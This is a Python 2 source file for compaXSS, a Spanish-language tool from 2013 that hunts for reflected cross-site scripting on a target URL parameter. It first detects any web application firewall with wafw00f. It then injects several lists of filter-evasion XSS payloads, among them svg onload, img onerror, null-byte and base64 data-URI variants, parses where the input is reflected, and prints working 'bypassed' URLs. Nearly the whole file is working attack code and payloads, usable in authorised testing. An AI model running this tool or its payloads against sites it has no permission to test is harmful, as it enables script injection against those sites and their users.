#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#         Copyright 2013 @Fr4phc0r3 - @juan_eljach
#
#   <fraphcore@hotmail.com>    <juan_eljach10@hotmail.com>
#
# Update: http://bugone.tk/compaXSS
#
######################
import os            #
import sys           #
import urllib        #
import urllib2       #
import re            #
import wafw00f       #####################
from urlparse import urlparse, parse_qs  #
from HTMLParser import HTMLParser        #
from optparse import OptionParser        #                     
##########################################
#
#Core compaXSS
#
URL = ""
keyword = "vector"
refleccion = 0 
parsero = 0
parser = 0
etiquetasabiertas = []                       
etiquetalimpia = ""
validacion = ['input','textarea','img'] 
ignorar = ['html','head','br','header','nav','meta','footer']             
listavacia = []
etiquetaAbierta = []

#Colores
class color:
    amarillo = '\033[1;33m'
    azul = '\033[94m'
    rojo = '\033[91m'
    verde = '\033[92m'
    blanco = '\033[0m'
if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass
print color.azul + "\t\t#######################|>\033[1;33mCompaXSS\033[94m<|#########################" + color.blanco
print color.azul + "\t\t#                       Developers                         #" + color.blanco
print color.azul + "\t\t##\033[91m+\033[94m=>             @Fr4phc0r3 - @juan_eljach            <=\033[91m+\033[94m##" + color.blanco
print color.azul + "\t\t##\033[91m+\033[94m>\033[92m                        XSS                         \033[94m<\033[91m+\033[94m##" + color.blanco
print color.azul + "\t\t##\033[91m+\033[94m>                       V1.0                         <\033[91m+\033[94m##" + color.blanco
print color.azul + "\t\t##\033[91m+\033[94m>         ################################           <\033[91m+\033[94m##" + color.blanco
print color.azul + "\t\t#            #\033[91m+\033[94m>\033[1;31m   Bypass XSS Reflected   \033[94m<\033[91m+\033[94m#              #" + color.blanco
print color.azul + "\t\t############################################################\n" + color.blanco 
#Vectores Cross-site scripting (xss) 
vectores = [
    "javascript:alert(0);",
    "javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x",
    "<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "<script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"/><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
    "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
    "\"/><img src=x onerror=x.onerror=prompt(0)>",
    "<option>'><button><img src=x onerror=alert(0);></button></option>",
    "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
    "<script>alert(0);</script>",
    "<svg/onload=prompt(0);>", 
    "<body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "<img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "<marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "<img/src=` onerror=alert(1)>", 
    "<svg/onload=alert(0);prompt(0);>",
    "<scri%00pt>confirm(0);</scri%00pt>",
    "<script>'alert(0)%3B<%2Fscript>",
    "<video src=. onerror=prompt(0)>",
    "<button>'><img src=x onerror=alert(0);></button>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
    "<img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>"
]

vectorescrazy = [ #Estableciendo la etiqueta Attr  
    "javascript:alert(0);",
    "\"><script>alert(0)</script>",
    "\"><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "\"><marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "\"><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "\"\/><option>'><button><img src=x onerror=alert(1);></button></option>",
    "\"><scri%00pt>confirm(0);</scri%00pt>",
    "\"><script>'alert(0)%3B<%2Fscript>",
    "\"><img src=\"x\" onerror=\"alert(0)\"/>",
    "\"><imgsrc=x onerror=alert.onerror=alert(1)>",
    "\"><script>alert(String.fromCharCode(88,83,83));</script>",
    "\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "\"\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
]

vectores2 = [
    "\"/><img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"/><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "\"/><img/src=` onerror=alert(1)>",
    "\"/><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "\"/><script>'alert(0)%3B<%2Fscript>",
    "\"/><scri%00pt>confirm(0);</scri%00pt>",
    "\"/><marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
    "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
    "\"/><script>alert(String.fromCharCode(88,83,83));</script>",
    "\"/><script>alert(0);</script><img src=x onerror=x.onerror=prompt(0)>",
    "\"\/><img src=\"x\" onerror=\"alert(0)\"/>", 
    "\"\/><audio src=x onerror=alert(0)>",
    "\"\/><img/src=` onerror=alert(0)>",
    "\"\/><img src=\"x\" onerror=\"prompt(/XSS/.source)\"/>",
    "\"\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
]

def main():
    options_parser = OptionParser()
    options_parser.add_option("--url", dest="url",
                  help="URL a ejecutar", metavar="URL")                                
    (options, args) = options_parser.parse_args()

    if options.url:
        if (keyword not in options.url):
            exit("Algo salio mal.\033[91m :(\033[0m " "\nEjemplo: python compaxss.py --url http://victima.com/?parametro=" + keyword + "\n")
    else:
        exit("Algo salio mal.\033[91m :(\033[0m " "\nEjemplo: python compaxss.py --url http://victima.com/?parametro=" + keyword + "\n")
    global URL
    URL = options.url
    
    print "\n\033[1;33mObjetivo:\033[94m " + URL 
    url_to_waf = str(raw_input("Especifique el dominio para la deteccion de WAF: "))
    if not (url_to_waf.startswith('http://') or url_to_waf.startswith('https://')):
        url_to_waf = 'http://' + url_to_waf
    print url_to_waf
    print "Detectando WAF"
    wafw00f.detector(url_to_waf) 
    print "\n\033[1;33mObjetivo:\033[94m " + URL  
    print color.verde + "\n[+] Injectando:\033[91m vectores\033[94m...\n" + color.blanco
    compaXSS = empanada(URL) 
    
    if(keyword.lower() in compaXSS.lower()):

        global refleccion
        refleccion = compaXSS.lower().count(keyword.lower())
        print color.verde + "[+] Verificando" + color.blanco + " Respuestas => \033[1;33m" + str(refleccion) + "\033[0m"
        
    else:
        exit(color.rojo + "CONSEJO: " + color.blanco + "Comprobar el valor o salir de compaXSS.\n")
    
    for i in range(refleccion):
        print color.azul + "\n\nTesting: " + color.blanco + str(i + 1)
        global parsero
        parsero = i+1
        analisis(compaXSS)
        #Las benditas Globales
        global core, cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript, etiquetasabiertas, etiquetaAbierta, parser, etiquetalimpia
        core, etiquetasabiertas, etiquetaAbierta = [], [], []
        cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript = False, False, False, False, False
        parser = 0
        etiquetalimpia = "" #Nada por aqui
    
    print color.azul + "\n\nVectores Bypasseadores:" + color.blanco
    for payload in listavacia:
        print payload
    
#Nueva funcion de Verificando datos
def analisis(compaXSS):
    print "\nVerificando la keyword: \033[1;31m"+ keyword +"\033[0m"
    location = javascriptHTML(compaXSS)
    if(location == "comment"): #Comprobar si es un form de comentarios
        print "Parece ser un comentario"
        comentarios()
    elif(location == "script_data"):
        print "Datos de script disponibles en etiquetas."
        script()
    elif(location == "html_data"):
        print "Datos de etiquetas en Texto plano"
        datos()
    elif(location == "start_end_tag_attr"):
        print "Datos de etiquetas Vacias."
        orientadoATTR()
    elif(location == "attr"):
        print "Datos de etiquetas HTML"
        datosHTML()

#Funcion Javascript y html
def javascriptHTML(compaXSS):
    parser = HTMLcompa()
    location = ""
    try:
        parser.feed(compaXSS)
    except Exception as e:
        location = str(e)
    except:
        print color.rojo + "ERROR: " + color.blanco + "Algo salio mal, vuelve a ejecutar a compaXSS"
    return location

#Mas y mas funciones
def comprobacionXSS(parametroXSS, comparacion):
    analisisString = "inicio" + parametroXSS + "envio"
    compararString = "inicio" + comparacion + "envio"
    URLweb = URL.replace(keyword, analisisString)
    try:
        respuesta = empanada(URLweb)
    except:
        respuesta = ""
    success = False
    Game0ver = 0
    for m in re.finditer('inicio', respuesta, re.IGNORECASE):
        Game0ver += 1
        if((Game0ver == parsero) and (respuesta[m.start():m.start()+len(compararString)].lower() == compararString.lower())):
            success = True
            break
    return success
    
#Funcion empanada
def empanada(frita):
    try:
        req = urllib2.Request(frita)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\n" + color.rojo + "ERROR: " + color.blanco+ "El parametro o la URL es invalida.\n"

#Funcion de XSS en comentarios
def comentarios():
    print color.verde + "[+]" + color.blanco + " XSS Reflejado"
    payload = "--><script>alert(1);</script>"
    if(comprobacionXSS(payload,payload)):
        payload = "--><script>alert(1);</script>"
        if(comprobacionXSS(payload + "<!--",payload+"<!--")):
            payload = "\"><script>var x = prompt;x(0);x(/XSS/.source);x(0);;x(1);</script><'>" 
    else:
        # Limpieza e insertacion de --> <--
        if(comprobacionXSS("-->", "-->")):
            clean = comprobacionXSS("<!--", "<!--")
            found = False
            for pyxss in vectores:
                pyxss = "-->" + pyxss
                if(clean):
                    pyxss = pyxss + "<!--"
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion del vector."
        else:
            payload = ""
            print color.rojo + "CONSEJO: " + color.blanco + "No es necesario utilizar --> porque no se refleja."
            
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color.verde + "[+]" + color.blanco + " Posible vector bypass para el parametro:"
        print payload
        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))

def script():
    print "\nCreo que es mejor utilizar otro metodo para saltarse el XSS"
    
def datos():
    print "\n[Puedes insertar el vector solidamente.]"
    payload = "<script>alert(1);</script>"
    if("textarea" in etiquetasabiertas):
        payload = "</textarea>" + payload
    if("title" in etiquetasabiertas):
        payload = "</title>" + payload
    if(comprobacionXSS(payload,payload)):
        payload = payload
    else:
        found = False
        for pyxss in vectores:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
        if(not found):
            payload = ""
            print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion."

    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color.verde + "[+]" + color.blanco + " XSS Reflejado"
        print payload
        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))

def orientadoATTR():
    print color.amarillo + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color.blanco
    payload = "\"/><script>alert(0);</script>"
    if(comprobacionXSS(payload,payload)):
        payload = "\"/><script>alert(0);</script>" + "\"><img src=x onerror=alert.onerror=alert(0)>"
        if(comprobacionXSS(payload+"<br%20x=\"", payload+"<br x=\"")):
            payload = "\"/><img src=x onerror=x.onerror=prompt(0);alert(0)><br x=\""
    else:
        if(comprobacionXSS("/>", "/>")):
            #--> Direfentes derivaciones <!-- "> /"/ <!--
            clean = comprobacionXSS("<br%20x=\"", "<br x=\"")
            found = False
            for pyxss in vectores2:
                if(clean):
                    pyxss = pyxss + "<br attr=\""
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color.rojo + "CONSEJO: " + color.blanco + "Parece que no hubo un bypass, comprueba manualmente."
        else:
            print color.rojo + "MENSAJE:" + color.blanco + " No se puede utilizar /> parece ser solido." #comprobacion de vector javascript:
            invalidez = [
                "\"></" + etiquetalimpia + "><script>alert(0);</script>",
                "><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
                "\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
                "\"><script>alert(String.fromCharCode(88,83,83));</script>",
                "\"><script>'alert(0)%3B<%2Fscript>",
                "javascript:prompt(/xss/.source);",
                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
                "\"<div><script>alert(0);</script>"
                ]
            found = False
            for pyxss in invalidez:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion."
            
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color.verde + "MENSAJE: " + color.blanco + "Utiliza el siguiente vector para bypassear el parametro"
        print payload
        print "\033[1;33mBypasseado:\033[0m : " + URL.replace(keyword, urllib.quote_plus(payload))

def datosHTML():
    print color.amarillo + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color.blanco
    payload = "\"></" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "><script>alert(1);</script>" + "><script>alert(0);</script>"
    if(comprobacionXSS(payload,payload)):
        if(comprobacionXSS(payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "%20x=\"", payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\"")):
            payload = "\"></" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "><img src=x onerror=x.onerror=prompt(0);alert(0)><script>alert(1);</script><" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\""
    else:
        if(comprobacionXSS("\">", "\">")):
            # Direfentes derivaciones <!-- "> /"/
            clean_str = "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\""
            clean = comprobacionXSS("<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "%20x=\"", clean_str)
            found = False
            for pyxss in vectorescrazy:
                if(clean):
                    pyxss = pyxss + clean_str
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente el vector, para comprobar la ejecucion"
        else:
            print color.rojo + "[+]" + color.blanco + " No se puede utilizar \"> parece ser solido."
            invalidez = [
                "\"<div><script>alert(0);</script>",
                "\"<script>confirm(0);prompt(2);alert(/XSS/.source)</script>",
                "\"</><script>alert(0)</script>",
                "\"<><img src=\"x\" onerror=\"alert(0)\"/>",
                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
                "\"<img src=x onerror=x.onerror=prompt(/XSS/.source);confirm(1);alert(2);prompt(3);alert(4);alert(4);prompt('xss')>"
                ]
            found = False
            for pyxss in invalidez:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color.rojo + "CONSEJO: " + color.blanco + "Verifica manualmente para comprobar la ejecucion"
            
    
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color.verde + "MENSAJE: " + color.blanco + "Verifica la importancia del Bypass o sal de la tool."
        print payload
        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))
        
#Clase HTMLcompa conexion con las comprobacion con los Datos
class HTMLcompa(HTMLParser):
    def handle_comment(self, data):
        global parser
        if(keyword.lower() in data.lower()):
            parser += 1
            if(parser == parsero):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global parser
        global parsero
        global etiquetalimpia
        if (keyword.lower() in str(attrs).lower()):
            parser += 1
            if(parser == parsero):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global etiquetasabiertas
        global etiquetaAbierta
        global parser
        if(tag not in ignorar):
            etiquetasabiertas.append(tag)
        if (keyword.lower() in str(attrs).lower()):
            if(tag == "script"):
                parser += 1
                if(parser == parsero):
                    raise Exception("script")
            else:
                parser += 1
                if(parser == parsero):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global etiquetasabiertas
        global etiquetaAbierta
        global parser
        if(tag not in ignorar):
            etiquetasabiertas.remove(tag)
            
    def handle_data(self, data):
        global parser
        if (keyword.lower() in data.lower()):
            parser += 1
            if(parser == parsero):
 
                try:
                    
                    if(etiquetasabiertas[len(etiquetasabiertas)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")
                    #Happy Hacking!
if __name__ == "__main__":
    main()
